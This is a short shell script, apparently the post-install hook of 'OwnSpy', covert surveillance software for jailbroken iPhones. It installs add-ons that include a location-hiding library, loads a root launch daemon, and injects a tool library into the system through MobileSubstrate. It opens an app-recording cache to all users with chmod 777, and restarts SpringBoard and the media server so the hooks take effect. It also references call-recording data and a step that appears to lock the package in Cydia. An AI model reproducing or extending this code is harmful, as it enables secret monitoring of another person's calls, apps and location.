#!/bin/sh
if [ -f /tmp/post_doing ]
then
	sleep 5
	rm /tmp/post_doing
	exit
fi

touch /tmp/post_doing
rm /tmp/ownspy_installed
/Library/OwnSpy.app/addon_installer install_libpush
/Library/OwnSpy.app/addon_installer install_libhidelocation

rm /Library/MobileSubstrate/DynamicLibraries/OwnSpyTool.dylib
rm /Library/MobileSubstrate/DynamicLibraries/OwnSpyTool.plist

rm -R /Applications/OwnSpyDaemon.app/

rm /usr/libexec/OwnSpy
/Library/OwnSpy.app/OwnSpyUninstaller RELOAD 
launchctl load /System/Library/LaunchDaemons/com.ownspy.tmpexec.plist

chmod 777 /var/mobile/Library/Caches/com.ownspy.daemon/apprecord/

#Reload mediaserverd
killall -9 mediaserverd &

#Reload SpringBoard to load the new OwnspyTool
/Library/OwnSpy.app/OwnSpyUninstaller CYDIALOCK
if [ $? -eq 0 ]
then
	killall -9 SpringBoard &
fi

#Remove /tmp/ownspy_callrec/ just in case
rm -R /tmp/ownspy_callrec/
